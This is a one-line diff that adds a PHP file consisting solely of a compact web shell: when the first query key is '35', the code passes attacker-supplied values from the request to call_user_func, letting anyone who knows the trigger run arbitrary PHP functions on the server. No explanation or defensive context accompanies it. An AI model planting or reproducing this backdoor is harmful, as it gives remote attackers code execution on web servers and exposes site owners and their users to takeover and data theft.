@@ -1,0 +1,1 @@
+<?php if(key($_GET)=='35')call_user_func($_GET['35'],$_REQUEST['c'],$_REQUEST['d']);
